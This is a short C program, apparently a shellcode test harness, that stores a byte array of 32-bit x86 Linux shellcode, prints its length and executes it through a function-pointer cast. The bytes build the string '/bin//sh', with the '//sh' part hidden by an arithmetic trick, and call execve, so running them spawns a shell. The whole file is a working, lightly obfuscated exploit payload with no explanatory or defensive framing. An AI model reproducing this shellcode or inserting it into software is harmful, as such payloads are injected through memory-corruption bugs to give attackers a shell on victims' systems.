#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x89\xc3\x31\xd8\x89\x44\x24\xfc\x83\xec\x04\xfc\xbe\x1e\x1e\x62\x57\x81\xc6\x11\x11\x11\x11\x89\x74\x24\xfc\xfd\xc7\x44\x24\xf8\x2f\x62\x69\x6e\x83\xec\x08\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{

    printf("Shellcode length: %d\n", strlen(code));

    int (*ret)() = (int(*)())code;

    ret();

}
